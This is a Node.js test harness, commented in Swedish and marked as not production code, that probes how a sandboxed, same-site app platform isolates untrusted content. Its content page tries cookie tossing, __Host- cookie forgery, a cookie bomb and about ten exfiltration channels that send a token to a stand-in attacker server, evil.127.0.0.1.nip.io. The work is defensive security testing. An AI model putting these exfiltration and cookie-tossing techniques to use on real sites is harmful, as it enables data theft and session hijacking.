'use strict';
/*
 * Spik-server (INGEN produktionskod). Modellen följer ADR 0002: ALLT ligger under
 * EN registrerbar domän (BASE_DOMAIN = lvh.me), en subdomännivå:
 *   login.lvh.me   – central inloggning
 *   bygg.lvh.me    – byggverktyget (+ dess "API"-yta för (a)(b)(c))
 *   p-demo.lvh.me  – förhandsvisning (innehåll), inramad av bygg
 *   app.lvh.me     – plattformsägt skal för publicerad app
 *   app--c.lvh.me  – appens opålitliga innehåll, inramat av skalet
 * Allt ovan är SAME-SITE. En ANDRA registrerbar domän (localtest.me) används
 * ENBART till kontrollfallet (cross-site) i S1.4.
 *
 * Server 2 = "extern" attackerar-server på :9443 (evil.127.0.0.1.nip.io) som
 * LOGGAR allt den tar emot – så mäter vi läckage.
 *
 * Kör: `node server.js`. Kräver cert i certs/ (kör ./gen-cert.sh först).
 */
const https = require('node:https');
const fs = require('node:fs');
const crypto = require('node:crypto');
const path = require('node:path');
const { URL } = require('node:url');

const PORT = 8443;
const EXT_PORT = 9443;
const EXT_HOST = 'evil.127.0.0.1.nip.io';
const BASE_DOMAIN = 'lvh.me';
const ALT_DOMAIN = 'localtest.me'; // enbart cross-site-kontroll
const BASE = (h) => `https://${h}:${PORT}`;
const EXT_BASE = `https://${EXT_HOST}:${EXT_PORT}`;
const SECRET = crypto.randomBytes(32);

const tls = {
  key: fs.readFileSync(path.join(__dirname, 'certs', 'key.pem')),
  cert: fs.readFileSync(path.join(__dirname, 'certs', 'cert.pem')),
};

// ---- roller per värdnamn (same-site under BASE_DOMAIN) -------------------
const SHELLS = {
  'app.lvh.me': { content: 'app--c.lvh.me', cookie: '__Host-app_sess', kind: 'app' },
  'bygg.lvh.me': { content: 'p-demo.lvh.me', cookie: '__Host-bygg_sess', kind: 'preview' },
};
const CONTENTS = {
  'app--c.lvh.me': { cookie: '__Host-content_sess', shell: 'app.lvh.me' },
  'p-demo.lvh.me': { cookie: '__Host-preview_sess', shell: 'bygg.lvh.me' },
  'app--c.localtest.me': { cookie: '__Host-content_sess', shell: 'app.localtest.me' }, // för cross-site-kontroll
};
const LOGIN = 'login.lvh.me';
const BYGG = 'bygg.lvh.me'; // "byggverktygets API" i (a)(b)(c)
// värdar som får rendera /xframe (inkl. cross-site-framaren på ALT_DOMAIN)
const XFRAMERS = new Set(['bygg.lvh.me', 'app.lvh.me', 'bygg.localtest.me']);

// ---- biljetter (HMAC) ----------------------------------------------------
function mintTicket(aud, ttlMs = 30000) {
  const body = { aud, exp: Date.now() + ttlMs, nonce: crypto.randomBytes(6).toString('hex') };
  const p = Buffer.from(JSON.stringify(body)).toString('base64url');
  const sig = crypto.createHmac('sha256', SECRET).update(p).digest('base64url');
  return `${p}.${sig}`;
}
function verifyTicket(t, aud) {
  if (typeof t !== 'string' || !t.includes('.')) return false;
  const [p, sig] = t.split('.');
  const expect = crypto.createHmac('sha256', SECRET).update(p).digest('base64url');
  if (sig.length !== expect.length || !crypto.timingSafeEqual(Buffer.from(sig), Buffer.from(expect))) return false;
  let body;
  try { body = JSON.parse(Buffer.from(p, 'base64url').toString()); } catch { return false; }
  return body.aud === aud && body.exp > Date.now();
}

function cookies(req) {
  const out = {};
  const h = req.headers.cookie;
  if (!h) return out;
  for (const part of h.split(';')) {
    const i = part.indexOf('=');
    if (i > 0) out[part.slice(0, i).trim()] = part.slice(i + 1).trim();
  }
  return out;
}
function setHostCookie(name, val, sameSite = 'Lax') {
  return `${name}=${val}; Path=/; Secure; HttpOnly; SameSite=${sameSite}`;
}
const esc = (s) => String(s).replace(/[<>&"]/g, (c) => ({ '<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;' }[c]));
const secOf = (req) => ({
  dest: req.headers['sec-fetch-dest'] || null,
  site: req.headers['sec-fetch-site'] || null,
  mode: req.headers['sec-fetch-mode'] || null,
  origin: req.headers['origin'] || null,
});

// ---- innehållssidan (opålitlig appkod) ----------------------------------
function contentPage(host, target, token) {
  return `<!doctype html><html><head><meta charset="utf-8"><title>innehall</title></head>
<body><h1 id="t">content ${esc(host)}</h1>
<script>
const REPORT = (window.__report = { host: ${JSON.stringify(host)}, token: ${JSON.stringify(token)}, cookieVisible: null, api: null, attempts: {}, tossing: {}, exfilDone: false });
const TARGET = ${JSON.stringify(target)}, TOKEN = ${JSON.stringify(token)}, BASE_DOMAIN = ${JSON.stringify(BASE_DOMAIN)};
function rec(m, ran, err){ REPORT.attempts[m] = { ran: ran, err: err ? String(err).slice(0,120) : null }; }
// S1.5: HttpOnly => document.cookie ska inte visa __Host-kakorna
REPORT.cookieVisible = document.cookie;
// S1.2: skickar iframen sin egen kaka med credentials:same-origin?
fetch('/_api/me', { credentials: 'same-origin' }).then(r=>r.json()).then(j=>{ REPORT.api = j; }).catch(e=>{ REPORT.api = { error:String(e).slice(0,120) }; });

// (a) COOKIE TOSSING: plantera Domain=<basdomän>-kaka + försök förfalska __Host-
try { document.cookie = 'toss_domain=EVIL; Domain=' + BASE_DOMAIN + '; Path=/; Secure'; REPORT.tossing.setDomain = document.cookie.includes('toss_domain'); } catch(e){ REPORT.tossing.setDomain = 'err:'+e; }
// __Host- MED Domain= ska vägras av webbläsaren
try { document.cookie = '__Host-app_sess=FORGED; Domain=' + BASE_DOMAIN + '; Path=/; Secure'; REPORT.tossing.forgeHostWithDomain = document.cookie.includes('__Host-app_sess=FORGED'); } catch(e){ REPORT.tossing.forgeHostWithDomain = 'err:'+e; }
// __Host- host-only (egen värd) – sätts på app--c men INTE på andra värdar
try { document.cookie = '__Host-app_sess=FORGED2; Path=/; Secure'; REPORT.tossing.forgeHostOwn = document.cookie.includes('__Host-app_sess=FORGED2'); } catch(e){ REPORT.tossing.forgeHostOwn = 'err:'+e; }
REPORT.tossing.afterDoc = document.cookie;

window.__runExfil = function(){
  try { fetch(TARGET + '/hit?m=fetch&t=' + TOKEN, { mode:'no-cors' }).then(()=>{}).catch(()=>{}); rec('fetch',true,null);} catch(e){ rec('fetch',false,e); }
  try { const im=new Image(); im.onerror=()=>{}; im.src=TARGET + '/hit?m=img&t=' + TOKEN; rec('img',true,null);} catch(e){ rec('img',false,e); }
  try { const ok = navigator.sendBeacon(TARGET + '/hit?m=beacon&t=' + TOKEN, 'x'); rec('sendBeacon', ok===true, ok===false?'returned false':null);} catch(e){ rec('sendBeacon',false,e); }
  try { const l=document.createElement('link'); l.rel='preconnect'; l.href=TARGET; document.head.appendChild(l); const l2=document.createElement('link'); l2.rel='dns-prefetch'; l2.href=TARGET; document.head.appendChild(l2); rec('link-preconnect',true,null);} catch(e){ rec('link-preconnect',false,e); }
  try { const ws=new WebSocket(TARGET.replace('https','wss') + '/hit?m=ws&t=' + TOKEN); ws.onerror=()=>{}; rec('websocket',true,null);} catch(e){ rec('websocket',false,e); }
  try { const pc=new RTCPeerConnection({ iceServers:[{ urls:'stun:stun.l.google.com:19302' }] }); REPORT.attempts.rtc={ran:true,err:null,iceRan:false}; pc.onicecandidate=e=>{ if(e.candidate) REPORT.attempts.rtc.iceRan=true; }; pc.createDataChannel('x'); pc.createOffer().then(o=>pc.setLocalDescription(o)).catch(()=>{}); } catch(e){ rec('rtc',false,e); }
  try { const w=window.open(TARGET + '/hit?m=winopen&t=' + TOKEN, '_blank'); rec('window.open', !!w, w?null:'returned null'); } catch(e){ rec('window.open',false,e); }
  try { const a=document.createElement('a'); a.href=TARGET + '/hit?m=atop&t=' + TOKEN; a.target='_top'; a.textContent='x'; document.body.appendChild(a); a.click(); rec('a-target-top',true,null);} catch(e){ rec('a-target-top',false,e); }
  try { top.location = TARGET + '/hit?m=toploc&t=' + TOKEN; rec('top.location',true,null);} catch(e){ rec('top.location',false,e); }
  try { const f=document.createElement('form'); f.method='GET'; f.action=TARGET + '/hit'; const i=document.createElement('input'); i.name='m'; i.value='form'; f.appendChild(i); const i2=document.createElement('input'); i2.name='t'; i2.value=TOKEN; f.appendChild(i2); document.body.appendChild(f); rec('form',true,null); setTimeout(()=>{ try{ f.submit(); }catch(e){} }, 300);} catch(e){ rec('form',false,e); }
  REPORT.exfilDone = true;
  setTimeout(()=>{ try { rec('location.href',true,null); location.href = TARGET + '/hit?m=selfnav&t=' + TOKEN; } catch(e){ rec('location.href',false,e); } }, 600);
};
</script></body></html>`;
}

// ---- driver-sida (plain, för (b)/(c) – mäter webbläsarens kakbeteende) ---
// Ingen restriktiv CSP: isolerar SameSite/Origin-mätningen från appens sandlåda.
function driverPage(host) {
  return `<!doctype html><meta charset="utf-8"><title>driver ${esc(host)}</title><h1>driver ${esc(host)}</h1>
<script>
window.__bomb = function(n, size){ const v='x'.repeat(size); for(let i=0;i<n;i++){ document.cookie='bomb'+i+'='+v+'; Domain=${BASE_DOMAIN}; Path=/; Secure'; } return document.cookie.length; };
</script>`;
}

// ---- skalsidan (plattformsägt) ------------------------------------------
function shellPage(host, cfg, ctURL) {
  const sandbox = 'allow-scripts allow-forms allow-same-origin allow-downloads';
  return `<!doctype html><html><head><meta charset="utf-8"><title>skal ${esc(host)}</title></head>
<body><h1>shell ${esc(host)} (${esc(cfg.kind)})</h1>
<iframe id="app" src="${esc(ctURL)}" sandbox="${sandbox}" style="width:600px;height:200px"></iframe>
<script>
window.__shell = { host: ${JSON.stringify(host)}, crossOriginReadThrew: null, iframeCookie: undefined };
setTimeout(()=>{ try { const w = document.getElementById('app').contentWindow; const c = w.document.cookie; window.__shell.iframeCookie = c; window.__shell.crossOriginReadThrew = false; } catch(e){ window.__shell.crossOriginReadThrew = true; window.__shell.err = String(e).slice(0,120); } }, 300);
</script></body></html>`;
}

// ---- byggverktygets "API" (echo-logg för (a)(b)(c)) ---------------------
const echoLog = new Map(); // token -> [rader]
function pushEcho(token, row) {
  if (!echoLog.has(token)) echoLog.set(token, []);
  echoLog.get(token).push(row);
}

// ---- plattformens request-hantering -------------------------------------
function platformHandler(req, res) {
  const host = (req.headers.host || '').split(':')[0];
  const u = new URL(req.url, BASE(host));
  const sec = secOf(req);
  const send = (code, headers, body) => { res.writeHead(code, headers); res.end(body); };

  if (u.pathname === '/_health') return send(200, { 'content-type': 'text/plain' }, 'ok');

  // ---- KONTROLLFALL: rama in godtycklig origin (cross-site) ------------
  if (u.pathname === '/xframe' && XFRAMERS.has(host)) {
    const src = u.searchParams.get('src') || '';
    const sandbox = 'allow-scripts allow-forms allow-same-origin allow-downloads';
    const csp = `default-src 'self'; frame-src ${new URL(src).origin}; script-src 'unsafe-inline'`;
    const body = `<!doctype html><meta charset="utf-8"><title>xframe ${esc(host)}</title>
<h1>xframe host=${esc(host)} (cross-site test)</h1>
<iframe id="app" src="${esc(src)}" sandbox="${sandbox}" style="width:600px;height:200px"></iframe>`;
    return send(200, { 'content-type': 'text/html', 'content-security-policy': csp }, body);
  }

  // ---- BYGGVERKTYGETS API-yta (a/b/c) ---------------------------------
  if (host === BYGG && u.pathname.startsWith('/_api/')) {
    // sätt byggkakor: host-only, Lax resp. Strict + en __Host-kaka
    if (u.pathname === '/_api/setcookies') {
      return send(200, { 'content-type': 'text/plain', 'set-cookie': [
        'bygg_lax=L; Path=/; Secure; SameSite=Lax',
        'bygg_strict=S; Path=/; Secure; SameSite=Strict',
        setHostCookie('__Host-bygg_api', 'H', 'Lax'),
      ] }, 'cookies set');
    }
    // Clear-Site-Data: rensa kakor (för (c))
    if (u.pathname === '/_api/clear') {
      return send(200, { 'content-type': 'text/plain', 'clear-site-data': '"cookies"' }, 'cleared');
    }
    // echo: logga vad servern SER (kakor, Origin, Sec-Fetch-Site) per token
    if (u.pathname === '/_api/echo') {
      const token = u.searchParams.get('t') || 'na';
      const kase = u.searchParams.get('case') || (req.method === 'POST' ? 'post' : 'get');
      const ck = cookies(req);
      pushEcho(token, { method: req.method, case: kase, cookieHeader: req.headers.cookie || '', cookieNames: Object.keys(ck), origin: sec.origin, secSite: sec.site, secDest: sec.dest });
      const acao = sec.origin || '*';
      return send(200, { 'content-type': 'application/json', 'access-control-allow-origin': acao, 'access-control-allow-credentials': 'true' },
        JSON.stringify({ ok: true, seen: { cookieNames: Object.keys(ck), origin: sec.origin, secSite: sec.site, secDest: sec.dest } }));
    }
    if (u.pathname === '/_api/echo-log') {
      const token = u.searchParams.get('t') || 'na';
      return send(200, { 'content-type': 'application/json', 'access-control-allow-origin': '*' }, JSON.stringify(echoLog.get(token) || []));
    }
    return send(404, {}, 'nf');
  }

  // ---- LOGIN: mynta app-biljett och skicka tillbaka -------------------
  if (host === LOGIN) {
    if (u.pathname === '/') {
      const rd = u.searchParams.get('rd');
      if (!rd) return send(400, {}, 'saknar rd');
      const audHost = new URL(rd).hostname;
      const ticket = mintTicket('app:' + audHost);
      const back = new URL(rd);
      back.searchParams.set('ticket', ticket);
      return send(302, { location: back.toString(), 'set-cookie': setHostCookie('__Host-login_sess', 'central') }, '');
    }
    return send(404, {}, 'nf');
  }

  // ---- SKAL (toppnivå) ------------------------------------------------
  if (SHELLS[host]) {
    const cfg = SHELLS[host];
    const ck = cookies(req);
    if (u.pathname === '/_api/whoami') {
      return send(200, { 'content-type': 'application/json' }, JSON.stringify({ host, hasCookie: !!ck[cfg.cookie], sec }));
    }
    if (u.pathname === '/') {
      const ticket = u.searchParams.get('ticket');
      if (ck[cfg.cookie]) {
        const ct = mintTicket('content:' + cfg.content);
        const params = new URLSearchParams({ ct, target: EXT_BASE, token: `${cfg.kind}-${Date.now()}` });
        const ctURL = `${BASE(cfg.content)}/?${params}`;
        const csp = `default-src 'self'; frame-src ${BASE(cfg.content)}; script-src 'unsafe-inline'; style-src 'unsafe-inline'`;
        return send(200, { 'content-type': 'text/html', 'content-security-policy': csp }, shellPage(host, cfg, ctURL));
      }
      if (ticket && verifyTicket(ticket, 'app:' + host)) {
        return send(302, { location: '/', 'set-cookie': setHostCookie(cfg.cookie, 'appsession') }, '');
      }
      const loginURL = `${BASE(LOGIN)}/?rd=${encodeURIComponent(BASE(host) + '/')}`;
      return send(302, { location: loginURL }, '');
    }
    return send(404, {}, 'nf');
  }

  // ---- INNEHÅLL (opålitligt, i sandlåda) ------------------------------
  if (CONTENTS[host]) {
    const cfg = CONTENTS[host];
    const ck = cookies(req);
    if (u.pathname === '/_api/me') {
      return send(200, { 'content-type': 'application/json' }, JSON.stringify({ host, hasCookie: !!ck[cfg.cookie], sec }));
    }
    if (u.pathname === '/driver') {
      // plain sida, ingen restriktiv CSP (mätverktyg för (b)/(c))
      return send(200, { 'content-type': 'text/html' }, driverPage(host));
    }
    if (u.pathname === '/') {
      // S4 Q8: skydd vid DIREKTBESÖK via Sec-Fetch
      const framed = sec.dest === 'iframe' && (sec.site === 'same-site' || sec.site === 'same-origin');
      const guard = u.searchParams.get('guard') !== 'off';
      if (guard && sec.dest && !framed) {
        return send(403, { 'content-type': 'text/html' }, `<h1>403 – direktbesök nekas</h1><p>Sec-Fetch-Dest=${esc(sec.dest)} Sec-Fetch-Site=${esc(sec.site)}</p>`);
      }
      const ct = u.searchParams.get('ct');
      const target = u.searchParams.get('target') || EXT_BASE;
      const token = u.searchParams.get('token') || 'na';
      const headers = { 'content-type': 'text/html' };
      headers['content-security-policy'] =
        "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; " +
        "img-src 'self' data:; connect-src 'self'; form-action 'self'; frame-src 'none'; base-uri 'none'";
      if (ct && verifyTicket(ct, 'content:' + host)) {
        headers['set-cookie'] = setHostCookie(cfg.cookie, 'contentsession');
      }
      return send(200, headers, contentPage(host, target, token));
    }
    return send(404, {}, 'nf');
  }

  return send(404, { 'content-type': 'text/plain' }, `okänd host: ${host}`);
}

// ---- extern "attackerar-server": loggar allt ----------------------------
const extHits = [];
function extHandler(req, res) {
  const u = new URL(req.url, EXT_BASE);
  if (u.pathname === '/_hits') {
    const t = u.searchParams.get('t');
    const rows = extHits.filter((h) => !t || h.t === t);
    res.writeHead(200, { 'content-type': 'application/json', 'access-control-allow-origin': '*' });
    return res.end(JSON.stringify(rows));
  }
  extHits.push({ m: u.searchParams.get('m'), t: u.searchParams.get('t'), path: u.pathname, at: Date.now() });
  res.writeHead(200, { 'content-type': 'image/gif', 'access-control-allow-origin': '*' });
  res.end(Buffer.from('GIF89a', 'ascii'));
}

https.createServer(tls, platformHandler).listen(PORT, '127.0.0.1', () => {
  console.log(`plattform: https://*:${PORT} (en domän: ${BASE_DOMAIN}; login/bygg/app/app--c/p-demo)`);
});
https.createServer(tls, extHandler).listen(EXT_PORT, '127.0.0.1', () => {
  console.log(`extern:    ${EXT_BASE}`);
});
